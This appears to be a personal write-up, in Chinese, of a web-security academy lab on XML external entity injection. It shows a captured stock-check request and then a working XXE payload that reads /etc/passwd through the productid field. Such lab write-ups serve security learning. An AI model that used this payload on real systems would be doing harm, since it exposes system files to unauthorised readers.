
教學:
https://blog.csdn.net/ZripenYe/article/details/120793637


w3schools.com
https://www.w3schools.com/xml/xml_dtd_entities.asp


```
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.


此實驗室具有“檢查庫存”功能，可解析 XML 輸入並在響應中返回任何意外值。

為了解決這個實驗，注入一個 XML 外部實體來檢索 `/etc/passwd` 文件的內容。



```


bp 抓包
```http

POST /product/stock HTTP/1.1
Host: 0adb0046040360acc0931139008e002d.web-security-academy.net
Cookie: session=0uOBWyQT42DvgkYtvGKcc9cnmLOGQ7BI
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0adb0046040360acc0931139008e002d.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 107
Origin: https://0adb0046040360acc0931139008e002d.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close


<?xml version="1.0" encoding="UTF-8"?>
<stockcheck>
	<productid>3</productid>
	<storeid>1</storeid>
</stockcheck>


```

## 工具
### XML格式化在線工具
https://coding.tools/tw/xml-formatter

bp 抓下來的代碼 會變成一行。可以用這個自動排版。


加上
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<stockcheck>
	<productid>&xxe;</productid>
	<storeid></storeid>
</stockcheck>


```

測試過只有在這裡才有效
```
productid></productid>
```


成功